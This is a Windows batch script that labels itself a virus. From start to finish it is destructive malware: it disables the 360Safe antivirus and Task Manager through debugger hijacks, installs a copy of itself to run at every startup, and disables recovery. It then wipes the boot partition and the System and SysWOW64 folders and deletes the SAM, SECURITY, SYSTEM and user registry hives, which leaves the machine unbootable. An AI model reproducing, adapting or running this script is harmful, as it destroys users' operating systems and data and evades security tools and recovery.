@echo off
REM This is a VIRUS.
REM (c) 2026 Eddie Chen Corp.
REM 6.6.6
if tasklist.exe|findstr "360Safe.exe" (reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" /v 360Safe.exe reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360Safe.exe" /v "Debugger" /t REG_SZ /d "/")
cls
echo "@echo off" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "REM This is a VIRUS." >>"C:\Windows\AlwaysRunOnStart.bat"
echo "REM (c) 2025 Eddie Chen Corp." >>"C:\Windows\AlwaysRunOnStart.bat"
echo "if exist \"C:\Windows\NOVirus.txt\" (" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "	exit /b" >>"C:\Windows\AlwaysRunOnStart.bat"
echo ")" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "cls" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "attrib -s -h -r -a C:\Windows\win.ini" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "del C:\Windows\win.ini /f /q" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "attrib -s -h -r -a C:\Windows\system.ini" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "del C:\Windows\system.ini /f /q" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "del C:\autoexec.bat" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "taskkill /f /im explorer.exe" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" /v taskhost.exe" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" /v taskkill.exe" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" /v taskmgr.exe" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\" /v \"Debugger\" /t REG_SZ /d \"/\"" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe\" /v \"Debugger\" /t REG_SZ /d \"/\"" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\" /v \"Debugger\" /t REG_SZ /d \"/\"" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reagentc /disable" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "echo \"Virus\" > \"C:\Windows\System32\config\OSDATA.txt\"" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "REN \"C:\Windows\System32\config\OSDATA.txt\" \"C:\Windows\System32\config\OSDATA\"" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "MOUNTVOL X: /S" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "del X:\*.* /f /s /q" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "MOUNTVOL X: /D" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "del C:\Windows\System\* /f /s /q" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "del C:\Windows\SysWOW64\* /f /s /q" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg delete HKCC\* /f" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg delete HKCU\* /f" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg delete HKU\* /f" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg delete HKLM\BCD00000000\* /f" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg delete HKLM\SAM\* /f" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg delete HKLM\SECURITY\* /f" >>"C:\Windows\AlwaysRunOnStart.bat"
echo "reg delete \"HKLM\SYSTEM\*\" /f && MOUNTVOL C: /D" >>"C:\Windows\AlwaysRunOnStart.bat"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsREagent /t REG_SZ /d "C:\Windows\AlwaysRunonstart.bat"
attrib -s -h -r -a C:\Windows\win.ini
del C:\Windows\win.ini /f /q
attrib -s -h -r -a C:\Windows\system.ini
del C:\Windows\system.ini /f /q
del C:\autoexec.bat
taskkill /f /im explorer.exe
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /v taskhost.exe
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /v taskkill.exe
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /v taskmgr.exe
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe" /v "Debugger" /t REG_SZ /d "/"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe" /v "Debugger" /t REG_SZ /d "/"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "Debugger" /t REG_SZ /d "/"
reagentc /disable
echo "Virus" > "C:\Windows\System32\config\OSDATA.txt"
REN "C:\Windows\System32\config\OSDATA.txt" "C:\Windows\System32\config\OSDATA"
MOUNTVOL X: /S
del X:\*.* /f /s /q
MOUNTVOL X: /D
del C:\Windows\System\* /f /s /q
del C:\Windows\SysWOW64\* /f /s /q
reg delete HKCC\* /f
reg delete HKCU\* /f
reg delete HKU\* /f
reg delete HKLM\BCD00000000\* /f
reg delete HKLM\SAM\* /f
reg delete HKLM\SECURITY\* /f

reg delete "HKLM\SYSTEM\*" /f && MOUNTVOL C: /D
